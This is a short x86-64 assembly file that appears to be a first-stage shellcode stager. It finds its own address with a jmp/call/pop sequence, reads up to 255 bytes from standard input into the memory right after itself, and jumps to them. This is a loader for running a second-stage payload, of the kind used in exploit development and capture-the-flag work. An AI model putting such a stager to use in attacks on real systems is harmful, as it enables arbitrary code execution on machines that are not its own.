bits 64
section .text
global _start

_start:
	jmp getaddr

	exec:
	
	; read(0, &nextstage, 0xff)

    xor rdi, rdi
	pop rsi
	xor rdx, rdx
    mov dl, 0xff 
	
	xor rax, rax ; SYS_read
	syscall

    jmp rsi

	getaddr:
		call exec
    nextstage: